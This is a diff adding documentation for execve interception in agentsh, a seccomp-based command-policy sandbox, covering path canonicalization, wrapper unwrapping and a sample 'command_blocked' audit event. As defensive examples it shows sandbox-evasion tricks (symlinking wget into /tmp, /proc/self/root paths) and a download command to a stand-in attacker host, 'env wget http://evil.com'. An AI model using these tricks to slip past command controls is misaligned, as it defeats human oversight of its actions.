@@ -127,6 +127,48 @@ signal_rules:
 
 See [Policy Documentation](operations/policies.md#signal-rules) for full configuration options.
 
+## Execve Interception
+
+Execve interception uses `SECCOMP_RET_USER_NOTIF` to trap `execve` and `execveat` syscalls, allowing agentsh to evaluate command execution against policy before it happens.
+
+### Security Hardening
+
+#### Path Canonicalization
+
+Before policy evaluation, agentsh resolves the executable path using `filepath.EvalSymlinks`. This defeats bypass attacks using:
+- Symlinks to blocked binaries (e.g., `ln -s /usr/bin/wget /tmp/safe && /tmp/safe`)
+- `/proc/self/root` paths (e.g., `/proc/self/root/usr/bin/wget`)
+- Relative path tricks
+
+The original (pre-canonicalization) path is preserved in audit events as `raw_filename` for forensic analysis.
+
+#### Transparent Command Unwrapping
+
+When a wrapper command (like `env`, `sudo`, or `ld-linux`) is detected, agentsh "unwraps" it to find the real payload command and evaluates both against policy. The most restrictive decision wins.
+
+**Example:** `env wget http://evil.com`
+1. `env` is recognized as transparent → unwrap
+2. Payload `wget` found after skipping flags/assignments
+3. Both `env` and `wget` evaluated: if `wget` is denied, the whole execution is denied
+
+See [Policy Documentation](operations/policies.md#transparent-commands) for configuration.
+
+### Execve Events
+
+```json
+{
+  "type": "command_blocked",
+  "timestamp": "2026-03-04T10:30:00Z",
+  "session_id": "sess_abc123",
+  "command": "/usr/bin/wget",
+  "raw_filename": "/proc/self/root/usr/bin/wget",
+  "unwrapped_from": "/usr/bin/env",
+  "payload_command": "wget",
+  "decision": "deny",
+  "policy_rule": "block-wget"
+}
+```
+
 ## Default Blocked Syscalls
 
 When seccomp is enabled, these syscalls are blocked by default:
